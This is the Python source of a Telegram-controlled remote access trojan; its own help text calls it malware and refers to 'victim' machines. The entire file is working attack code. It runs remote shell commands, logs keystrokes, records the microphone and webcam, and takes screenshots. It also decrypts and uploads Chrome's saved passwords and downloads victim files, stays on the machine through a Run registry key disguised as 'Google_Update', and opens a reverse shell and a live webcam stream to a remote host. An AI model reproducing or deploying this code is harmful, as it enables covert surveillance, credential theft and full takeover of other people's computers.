import telepot
import time
import os
import getpass
import subprocess
import socket
import glob
import sys
import pyaudio
import wave
import sqlite3
import psutil
import cv2
import numpy
from time import gmtime, strftime
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from pprint import pprint
from cv2 import VideoCapture,imwrite
from requests import get
from threading import Thread
from json import loads
from socket import gethostbyname,gethostname
from platform import platform,processor,node,uname

import win32crypt
from _winreg import *
from PIL import ImageGrab
from pynput.keyboard import Key, Listener, Controller

api_key = 'telegram api here'

#Set telegram group here.
group = [id_group_integer]

#Enable/Disable RSA signature
secure = False

# Get system operation
#sysoperator = sys.platform

bot = telepot.Bot(api_key)
def handle(msg):
	content_type, chat_type, chat_id = telepot.glance(msg)
	#pprint(msg)
	#print content_type,chat_type, chat_id
	if chat_type == 'group':
		if chat_id in group:
			if content_type == 'text':
				if secure:
					check_sign(msg)
				else:
					actions(msg['text'],chat_id)
			if content_type == 'document':
				bot.download_file(msg['document']['file_id'],msg['document']['file_name'])
				bot.sendMessage(chat_id,'Arquivo '+msg['document']['file_name']+' Salvo ;)')
	else:
		bot.sendMessage(chat_id,'Sai fora mano, voce nao eh bem-vindo aqui')

def check_sign(msg):
	cmd = msg['text'].split()
	chat_id = msg['chat']['id']

	#Chage to your public key
	public = '''
	
	'''

	msg = ' '.join(cmd[1:])
	key = RSA.importKey(public)
	public = key.publickey()
	now = strftime("%Y-%m-%d %H:%M", gmtime())
	msg_final = msg+now
	hash_msg = SHA256.new(msg_final).digest()
	signature = (long(cmd[0]),)
	if public.verify(hash_msg, signature):
		actions(' '.join(cmd[1:]),chat_id)
	else:
		bot.sendMessage(chat_id,'Get out bastard')

def actions(msg,chat_id):
	cmd = msg.split()

	if '/hosts' in cmd[0]:
		bot.sendMessage(chat_id,node())
	elif cmd[0].lower() in node().lower():
		if '/cmd' in cmd[1]:
			output = windows_command(cmd[2:]).decode('utf-8','ignore')
			bot.sendMessage(chat_id,output)

		elif '/process' in cmd[1]:
			result = list_process()
			bot.sendMessage(chat_id,result)

		elif '/kill' in cmd[1]:
			kill_process(int(cmd[2]),chat_id)

		elif '/list_dir' in cmd[1]:
			value = list_dir(cmd[2])
			bot.sendMessage(chat_id,value)

		elif '/dir' in cmd[1]:
			bot.sendMessage(chat_id,os.getcwd())

		elif '/print' in cmd[1]:
			if sys.platform == 'win32':
				file = os.environ.get('TEMP')+"\\"+"print.jpg"
			elif sys.platform == 'linux' or sys.platform == 'linux2':
				file = '/tmp/print.jpg'
			ImageGrab.grab().save(file,"JPEG")
			f = open(file, 'rb')
			bot.sendPhoto(chat_id,f)
			f.close()
			os.remove(file)

		elif '/keylogger' in cmd[1]:
			if sys.platform == 'win32':
				file = os.environ.get('TEMP')+'\\'+'keylogger.txt'
			elif sys.platform == 'linux' or sys.platform == 'linux2':
				file = '/tmp/keylogger.txt'
			t = Thread(target=keylloger)

			if loads(cmd[2]) is True:
				if t.isAlive() is False:
					bot.sendMessage(chat_id,"Keylogger actived!")
					t.start()

			elif loads(cmd[2]) is False:
				keyboard = Controller()
				keyboard.press(Key.esc)
				bot.sendMessage(chat_id,"Keylogger stopped!")
				f = open(file)
				bot.sendDocument(chat_id,f)
				f.close()
				os.remove(file)

		elif '/record_mic' in cmd[1]:
			t = Thread(target=record_mic,args=(cmd[2],chat_id))
			t.start()

		elif '/snapshot' in cmd[1]:
			snapshot(cmd[2],chat_id)

		elif '/cameras' in cmd[1]:
			result = list_cameras()
			bot.sendMessage(chat_id,result)

		elif '/download' in cmd[1]:
			f = open(cmd[2],'rb')
			bot.sendDocument(chat_id,f)

		elif '/chrome' in cmd[1]:
			chrome(chat_id)

		elif '/infos' in cmd[1]:
			msg = sys_infos()
			bot.sendMessage(chat_id,msg)

		elif '/persistent' in cmd[1]:
			tempdir = os.environ.get('TEMP')
			fileName = os.path.basename(sys.executable)
			run = "Software\Microsoft\Windows\CurrentVersion\Run"
			persistent(tempdir, fileName, run, chat_id)

		elif '/rev_shell' in cmd[1]:
			rs = Thread(target=reverse_shell,args=(cmd[2],cmd[3],chat_id))
			rs.start()

		elif '/rev_cam' in cmd[1]:
			rc = Thread(target=reverse_cam,args=(cmd[2],cmd[3],cmd[4],chat_id))
			rc.start()

		elif '/nmap_scan' in cmd[1]:
			nmap_scan(chat_id)

	elif '/help' in cmd[0]:
		msg = """[+] - Commands Available - [+]
		/help - show this message
		/hosts - show the hostname of all hosts availables
		hostname /cmd command - system commands
		hostname /process  - list all process
		hostname /kill PID - kill a process by PID
		hostname /infos - system basic infos
		hostname /dir - show current dir
		hostname /list_dir - list dir folders and files(regex)
		hostname /chrome - grab google chrome stored credentials
		hostname /print - screenshot
		hostname /keylogger true/false -  true start keylogger, false stop Keylogger and send file.
		hostname /record_mic seconds - Record audio from victim microphone
		hostname /cameras  - list cameras by ID number
		hostname /snapshot id - Take a picture from victim webcam, based on camera id
		hostname /download file path - download victim file
		hostname /persistent - make malware persistent
		hostname /rev_shell ip/host port - reverse shell
		hostname /rev_cam ip/host port - reverse webcam
		"""
		bot.sendMessage(chat_id,msg)

def list_process():
	result = []
	process = psutil.pids()
	for x in process:
		p = psutil.Process(x)
		result.append(' '.join([str(x),p.name()]))
	return '\n'.join(result)

def kill_process(pid,chat_id):
	try:
		p = psutil.Process(pid)
		p.terminate()
		bot.sendMessage(chat_id,"Process terminated!")
	except Exception as e:
		bot.sendMessage(chat_id,str(e))

def sys_infos():
	infos = []
	infos.append('[+] - System Infos - [+]')
	infos.append('User: '+ getpass.getuser())
	infos.append('Current Folder: '+ os.getcwd())
	infos.append('Plataform: '+ platform())
	if sys.platform == 'win32':
		infos.append('Processor: '+ processor())
	elif sys.platform == 'linux' or sys.platform == 'linux2':
		infos.append('Uname: '+ ' '.join(uname()))
	infos.append('Hostname: '+ node())
	infos.append('Local IP: '+gethostbyname(gethostname()))
	infos.append('[+] - External IP Infos - [+]')
	r = get('http://ip-api.com/json')
	result = loads(r.content)

	infos.append('External IP: '+result['query'])
	infos.append('City: '+result['city'])
	infos.append('Region: '+result['region'])
	infos.append('Region Name: '+result['regionName'])
	infos.append('Latitude: '+ str(result['lat']))
	infos.append('Longitude: '+ str(result['lon']))
	infos.append('ISP: '+result['isp'])
	return '\n'.join(infos)

def list_cameras():
	cam = []
	for x in range(0,10):
		camera = VideoCapture(x)
		if camera.grab() == True:
			result = 'Camera ID: %d' % x
			cam.append(result)
	return '\n'.join(cam)

def snapshot(cam_id,chat_id):
	try:
		camera = VideoCapture(int(cam_id))
		for i in xrange(30):
			camera.read()
		bot.sendMessage(chat_id,'Taking a picture!')
		retval,camera_capture = camera.read()
		if sys.platform == 'win32':
			file = os.environ.get('TEMP')+"\\"+"snapshot.png"
		elif sys.platform == 'linux' or sys.platform == 'linux2':
			file = "/tmp/snapshot.png"
		imwrite(file, camera_capture)
		del(camera)
		f = open(file,'rb')
		bot.sendPhoto(chat_id,f)
		f.close()
		os.remove(file)
	except Exception as e:
		bot.sendMessage(chat_id,str(e))

def record_mic(time,chat_id):
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	CHUNK = 1024
	RECORD_SECONDS = int(time)
	if sys.platform == 'win32':
		WAVE_OUTPUT_FILENAME = os.environ.get('TEMP')+'\\'+ 'file.wav'
		MP3_OUTPUT_FILENAME = os.environ.get('TEMP')+'\\'+ 'file.mp3'
	elif sys.platform == 'linux' or sys.platform == 'linux2':
		WAVE_OUTPUT_FILENAME = '/tmp/file.wav'
		MP3_OUTPUT_FILENAME = '/tmp/file.mp3'
	try:
		audio = pyaudio.PyAudio()
		stream = audio.open(format=FORMAT, channels=CHANNELS,rate=RATE, input=True,frames_per_buffer=CHUNK)
		bot.sendMessage(chat_id,'Recording...')
		frames = []

		for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
			data = stream.read(CHUNK)
			frames.append(data)
		# stop Recording
		stream.stop_stream()
		stream.close()
		audio.terminate()
		bot.sendMessage(chat_id,'finished recording')

		waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
		waveFile.setnchannels(CHANNELS)
		waveFile.setsampwidth(audio.get_sample_size(FORMAT))
		waveFile.setframerate(RATE)
		waveFile.writeframes(b''.join(frames))
		waveFile.close()

		f = open(WAVE_OUTPUT_FILENAME,'rb')
		bot.sendAudio(chat_id,f)
		f.close()
		os.remove(WAVE_OUTPUT_FILENAME)
	except Exception as e:
		bot.sendMessage(chat_id,str(e))

def keylloger():
	with Listener(on_press=on_press) as listener:
		listener.join()

def on_press(key):
	if sys.platform == 'win32':
		file = os.environ.get('TEMP')+'\\'+'keylogger.txt'
	elif sys.platform == 'linux' or sys.platform == 'linux2':
		file = '/tmp/keylogger.txt'
	with open(file,'a') as saida:
		if key == Key.space:
			saida.write(' ')
		elif key == Key.enter:
			saida.write('\n')
		elif key == Key.tab:
			saida.write('\t')
		elif key == Key.esc:
			return False
		else:
			key = str(key)
			if 'Key' not in key:
				key = str(key).split("'")[1]
				saida.write(key)

def windows_command(cmd):
	if sys.platform == 'win32':
		si = subprocess.STARTUPINFO()
		si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
		env = os.environ
		txt = subprocess.check_output(cmd,stdin=subprocess.PIPE,stderr=subprocess.PIPE,startupinfo=si,env=env)
	elif sys.platform == 'linux' or sys.platform == 'linux2':
		print cmd
		txt = subprocess.check_output(cmd)
	return txt

def list_dir(cmd):
	files = [name for name in glob.glob(cmd)]
	return '\n'.join(files)

def persistent(tempdir, fileName, run,chat_id):
	key = OpenKey(HKEY_CURRENT_USER, run)
	runkey =[]
	try:
		i = 0
		while True:
			subkey = EnumValue(key, i)
			runkey.append(subkey[0])
			i += 1
	except WindowsError:
		pass


	if 'Google_Update' not in runkey:
		try:
			os.system('copy %s %s'%(fileName, tempdir))
			fullpath = tempdir + "\\"+ fileName
			key= OpenKey(HKEY_CURRENT_USER, run,0,KEY_ALL_ACCESS)
			SetValueEx(key ,'Google_Update',0,REG_SZ,fullpath)
			key.Close()
			bot.sendMessage(chat_id,'Persistent created!')
		except WindowsError as e:
			bot.sendMessage(chat_id,'Error to create register!')
	else:
		bot.sendMessage(chat_id,'Persistent register already created!')

def chrome(chat_id):
	passwd = 'passw.txt'
	process = psutil.pids()
	for x in process:
		try:
			p = psutil.Process(x)
			if 'chrome' in p.name().lower():
				msg = 'Google PID %d terminated' %x
				bot.sendMessage(chat_id,msg)
				p.terminate()
		except Exception as e:
			pass

	credentials = []
	if sys.platform == 'win32':
		path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
	elif sys.platform == 'linux' or sys.platform == 'linux2':
		os.environ.get('HOME')+'/.config/google-chrome/Default'
	if (os.path.isdir(path) == True):
		connection = sqlite3.connect(path + "Login Data")
		try:
			with connection:
				cursor = connection.cursor()
				v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
				value = v.fetchall()

			for information in value:
				password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
				if password:
					credentials.append('URL: '+information[0])
					credentials.append('Username: '+information[1])
					credentials.append('Password: '+str(password))
					credentials.append(' ')
			f = open(passwd,'w')
			f.write('\n'.join(credentials))
			f.close()
			bot.sendDocument(chat_id,open(passwd))
			os.remove(passwd)
		except Exception as e:
			bot.sendMessage(chat_id,str(e))
	else:
		bot.sendMessage(chat_id,'Chrome Doesn\'t exists')

def reverse_shell(ip, port,chat_id):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, int(port)))
		while True:
			s.send(node()+'@ ')
			data = s.recv(1024).decode('utf-8','ignore')
			if data == "exit\n":
				s.send("Reverse shell closed.\n")
				bot.sendMessage(chat_id,'Reverse shell closed.')
				break
			comm = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			STDOUT, STDERR = comm.communicate()
			s.send(STDOUT)
			s.send(STDERR)
	except Exception as e:
		bot.sendMessage(chat_id,str(e).decode('utf-8','ignore'))

	s.close()



def reverse_cam(host, port,cam_id, chat_id):
	try:
		cap = cv2.VideoCapture(int(cam_id))
		while True:
			ret, frame = cap.read()
			rval, imgencode = cv2.imencode(".jpg", frame, [1,90])
			data = numpy.array(imgencode)
			stringData = data.tostring()

			s = socket.socket()
			s.connect((host, int(port)))
			s.sendall(stringData)
			s.close()
	except Exception as e:
		bot.sendMessage(chat_id,str(e).decode('utf-8','ignore'))

def main():
	bot.message_loop(handle)
	while 1:
		time.sleep(10)

if __name__ == "__main__":
	if (sys.platform == "linux" or sys.platform == "linux2"):
			msg = 'NEW HOST Linux => '+node()
			bot.sendMessage(group[0],msg)
			main()
	elif (sys.platform == "win32"):
			msg = 'NEW HOST Windows => '+node()
			bot.sendMessage(group[0],msg)
			main()
